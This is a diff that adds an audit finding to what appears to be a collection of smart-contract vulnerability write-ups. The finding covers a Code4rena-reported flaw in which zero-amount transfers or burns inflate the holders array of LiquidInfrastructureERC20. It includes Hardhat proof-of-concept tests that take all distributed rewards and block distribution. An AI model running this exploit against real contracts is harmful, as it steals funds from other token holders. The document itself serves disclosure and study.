@@ -171,3 +171,54 @@ Authors: [Eta](https://twitter.com/pwhattie), looking forward to your joining
   ```
 
   </details>
+
+## 3.[High] Holders array can be manipulated by transferring or burning with amount 0, stealing rewards or bricking certain functions
+
+### Transfer or burn 0 ERC-20 token
+
+- Summary: Users can manipulate the holders array in the LiquidInfrastructureERC20 contract by transferring or burning tokens with an amount of 0. This allows them to add their address multiple times to the array, leading to unfair distribution of rewards.
+
+- Impact & Recommendation: Adjust the logic in `_beforeTokenTransfer` to ignore burns, transfers where the amount is `0`, and transfers where the recipient already has a positive balance.
+  <br> 🐬: [Source](https://code4rena.com/reports/2024-02-althea-liquid-infrastructure#h-01-holders-array-can-be-manipulated-by-transferring-or-burning-with-amount-0-stealing-rewards-or-bricking-certain-functions) & [Report](https://code4rena.com/reports/2024-02-althea-liquid-infrastructure)
+
+  <details><summary>POC</summary>
+
+  ```solidity
+    it("malicious user can add himself to holders array multiple times and steal rewards", async function () {
+        const { infraERC20, erc20Owner, nftAccount1, holder1, holder2 } = await liquidErc20Fixture();
+        const nft = await deployLiquidNFT(nftAccount1);
+        const erc20 = await deployERC20A(erc20Owner);
+        await nft.setThresholds([await erc20.getAddress()], [parseEther('100')]);
+        await nft.transferFrom(nftAccount1.address, await infraERC20.getAddress(), await nft.AccountId());
+        await infraERC20.addManagedNFT(await nft.getAddress());
+        await infraERC20.setDistributableERC20s([await erc20.getAddress()]);
+        const OTHER_ADDRESS = '0x1111111111111111111111111111111111111111'
+        await infraERC20.approveHolder(holder1.address);
+        await infraERC20.approveHolder(holder2.address);
+        // Malicious user transfers 0 to himself to add himself to the holders array
+        await infraERC20.transferFrom(OTHER_ADDRESS, holder1.address, 0);
+        // Setup balances
+        await infraERC20.mint(holder1.address, parseEther('1'));
+        await infraERC20.mint(holder2.address, parseEther('1'));
+        await erc20.mint(await nft.getAddress(), parseEther('2'));
+        await infraERC20.withdrawFromAllManagedNFTs();
+        // Distribute to all holders fails because holder1 is in the holders array twice
+        // Calling distribute with 2 sends all funds to holder1
+        await mine(500);
+        await expect(infraERC20.distributeToAllHolders()).to.be.reverted;
+        await expect(() => infraERC20.distribute(2))
+            .to.changeTokenBalances(erc20, [holder1, holder2], [parseEther('2'), parseEther('0')]);
+        expect(await erc20.balanceOf(await infraERC20.getAddress())).to.eq(parseEther('0'));
+    });
+    it("malicious user can add zero address to holders array", async function () {
+        const { infraERC20, erc20Owner, nftAccount1, holder1 } = await liquidErc20Fixture();
+        for (let i = 0; i < 10; i++) {
+            await infraERC20.burn(0);
+        }
+        // I added a getHolders view function to better see this vulnerability
+        expect((await infraERC20.getHolders()).length).to.eq(10);
+    });
+
+  ```
+
+  </details>
